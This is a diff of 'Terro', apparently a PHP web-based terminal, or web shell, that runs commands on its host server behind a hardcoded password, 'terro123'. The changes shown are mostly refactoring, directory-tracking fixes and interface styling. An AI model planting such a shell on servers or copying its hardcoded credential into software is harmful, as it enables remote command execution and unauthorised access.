@@ -1,4 +1,4 @@
-<?php /** TERRO GENERATED CODE 19.12.2018_14:41:15 */ ?>
+<?php /** TERRO GENERATED CODE 19.12.2018_21:59:18 */ ?>
 <?php define('VERSION', '1.0 (beta)'); ?>
 <?php define('PASSWORD', 'terro123'); ?>
 <?php
@@ -103,6 +103,22 @@ class Terro {
         }
     }
 
+    public function getVersion() {
+        return VERSION;
+    }
+
+    public function isLoggedIn() {
+        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] == true;
+    }
+
+    public function getLoginMessage() {
+        return $this->loginMessage;
+    }
+
+    public function getCurrentDirectory() {
+        return $_SESSION['directory'];
+    }
+
     private function commandRouting($command) {
         chdir($_SESSION['directory']);
 
@@ -119,18 +135,6 @@ class Terro {
         chdir($this->orginalDirectory);
     }
 
-    public function getVersion() {
-        return VERSION;
-    }
-
-    public function isLoggedIn() {
-        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] == true;
-    }
-
-    public function getLoginMessage() {
-        return $this->loginMessage;
-    }
-
     private function execute($command) {
         $response = array();
 
@@ -139,25 +143,18 @@ class Terro {
             $response = array('Error');
         } else {
             if(strpos($command, 'cd') !== false) {
-                $_SESSION['directory'] = str_replace("cd ", "", $command);
+                chdir(str_replace("cd ", "", $command));
+                $_SESSION['directory'] = getcwd();
             }
         }
 
-        array_push($_SESSION['persist_commands'], FALSE);
         array_push($_SESSION['commands'], $command);
         array_push($_SESSION['command_responses'], $response);
     }
 
     private function clear() {
-        if (isset($_SESSION['logged_in'])) {
-            $logged_in = TRUE;
-        } else {
-            $logged_in = FALSE;
-        }
-        session_unset();
-        if ($logged_in) {
-            $_SESSION['logged_in'] = TRUE;
-        }
+        $_SESSION['commands'] = array();
+        $_SESSION['command_responses'] = array();
     }
 
     private function login() {
@@ -226,7 +223,7 @@ input:focus, textarea:focus {
 }
 .logo {
     font-size: 30px;
-    background: #ff385d;
+    background: #e0003b;
     font-family: "Open Sans";
     font-weight: 100;
     width: 70px;
@@ -255,7 +252,7 @@ input:focus, textarea:focus {
 .login-form button {
     height: 42px;
     -webkit-appearance: none;
-    background: #ff385d;
+    background: #e0003b;
     font-family: "Open Sans";
     font-weight: 100;
     border: none;
@@ -304,7 +301,7 @@ input:focus, textarea:focus {
 }
 .menu ul li.logo {
     font-size: 30px;
-    background: #ff385d;
+    background: #e0003b;
     font-family: "Open Sans";
     font-weight: 100;
 }
@@ -329,7 +326,7 @@ input:focus, textarea:focus {
     font-size: 14px;
 }
 .terminal {
-    height: calc(100vh - 22px);
+    height: calc(100vh - 22px - 20px);
     position: relative;
     overflow: auto;
     padding-bottom: 20px;
@@ -350,7 +347,7 @@ input:focus, textarea:focus {
     display: block;
 }
 .terminal .user {
-    color: #ff525e;
+    color: #e0003b;
 }
 .terminal .current-line {
     display: flex;
@@ -421,7 +418,7 @@ input:focus, textarea:focus {
     margin-top: 10px;
     height: 42px;
     -webkit-appearance: none;
-    background: #ff385d;
+    background: #e0003b;
     font-family: "Open Sans";
     font-weight: 100;
     border: none;
@@ -449,6 +446,18 @@ input:focus, textarea:focus {
 
 }
 
+.sysbar {
+    width: 100%;
+    height: 20px;
+    position: absolute;
+    bottom: 0;
+    background: rgba(0,0,0,0.2);
+    left: 70px;
+    padding: 2px 10px;
+    font-size: 12px;
+    line-height: 20px;
+    color: rgba(255,255,255,0.5);
+}
 
 /*** PHP INFO **/
 
@@ -523,6 +532,9 @@ input:focus, textarea:focus {
                 <span class="command-sign"><span class="user">terro</span>@<?= $_SERVER['HTTP_HOST']; ?>:~#</span> <input type="text" name="command" id="command" autocomplete="off" onkeydown="return command_keyed_down(event);" />
             </span>
         </form>
+    </div>
+    <div class="sysbar">
+        Current directory: <?= $terro->getCurrentDirectory(); ?>
     </div>
 </div><div class="content" data-content="parameters" style="display: none">
     <div class="parameters">
@@ -617,8 +629,10 @@ function command_keyed_down(event) {
     var key_code = event.keyCode;
     if (key_code == 38) {
         fill_in_previous_command();
+        return false;
     } else if (key_code == 40) {
         fill_in_next_command();
+        return false;
     } else if (key_code == 13) {
         if (event.shiftKey) {
             document.getElementById('commands').submit();
@@ -634,7 +648,8 @@ function fill_in_previous_command() {
         current_command_index = 0;
         return;
     }
-    document.getElementById('command').value = previous_commands[current_command_index];
+
+    $("#command").val(previous_commands[current_command_index]);
 }
 
 function fill_in_next_command() {
@@ -643,7 +658,8 @@ function fill_in_next_command() {
         current_command_index = previous_commands.length - 1;
         return;
     }
-    document.getElementById('command').value = previous_commands[current_command_index];
+
+    $("#command").val(previous_commands[current_command_index]);
 }
 
 $("document").ready(function() {
@@ -653,8 +669,6 @@ $("document").ready(function() {
     setTimeout(function() {
         $("a[href='"+hash+"']").click();
     }, 200);
-
-
 
     $(".menu li:not(.logo)").click(function() {
         $(".content").hide();
